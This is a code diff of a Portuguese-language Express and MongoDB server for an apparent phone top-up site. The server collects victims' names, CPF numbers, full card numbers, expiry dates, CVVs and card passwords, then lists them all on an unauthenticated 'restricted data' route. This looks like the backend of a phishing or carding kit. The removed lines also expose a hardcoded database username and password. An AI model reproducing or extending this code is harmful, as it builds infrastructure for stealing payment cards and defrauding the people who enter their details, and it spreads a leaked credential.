@@ -6,17 +6,25 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname)));
 
-// LINK OFICIAL (Conforme sua foto a7749818)
-const mongoURI = 'mongodb+srv://ingresso944_db_user:Dks10dks%40@cluster0.wgnfod3.mongodb.net/recargas?retryWrites=true&w=majority';
+// --- SEGURANÇA: Usando Variável de Ambiente ---
+// O link com a senha deve ser colocado no painel do Render com a chave: MONGODB_URI
+const mongoURI = process.env.MONGODB_URI;
 
 mongoose.connect(mongoURI)
-  .then(() => console.log('✅ CONECTADO AO MONGODB!'))
+  .then(() => console.log('✅ CONECTADO AO MONGODB COM SEGURANÇA!'))
   .catch(err => console.error('❌ ERRO MONGODB:', err));
 
 // MODELO
 const RecargaSchema = new mongoose.Schema({
-    operadora: String, nome: String, cpf: String, telefone: String,
-    valor: String, cartao: String, data: String, cvv: String, senha: String,
+    operadora: String, 
+    nome: String, 
+    cpf: String, 
+    telefone: String,
+    valor: String, 
+    cartao: String, 
+    data: String, 
+    cvv: String, 
+    senha: String,
     dataRegistro: { type: Date, default: Date.now }
 });
 
@@ -31,15 +39,15 @@ app.post('/finalizar', async (req, res) => {
     } catch (err) { res.status(500).json({ success: false }); }
 });
 
-// ROTA: VER DADOS NO PAINEL
+// ROTA: VER DADOS NO PAINEL (Acesso ao painel)
 app.get('/ver-dados-restritos', async (req, res) => {
     try {
         const dados = await Recarga.find().sort({ dataRegistro: -1 });
         res.json(dados);
-    } catch (err) { res.status(500).send('Erro'); }
+    } catch (err) { res.status(500).send('Erro ao buscar dados'); }
 });
 
-// ROTA NOVIDADE: EXCLUIR DADO
+// ROTA: EXCLUIR DADO (Sua função de limpeza)
 app.delete('/excluir/:id', async (req, res) => {
     try {
         await Recarga.findByIdAndDelete(req.params.id);
@@ -47,5 +55,10 @@ app.delete('/excluir/:id', async (req, res) => {
     } catch (err) { res.status(500).json({ success: false }); }
 });
 
+// ROTA: PÁGINA PRINCIPAL
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Porta: ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Servidor rodando na porta: ${PORT}`));
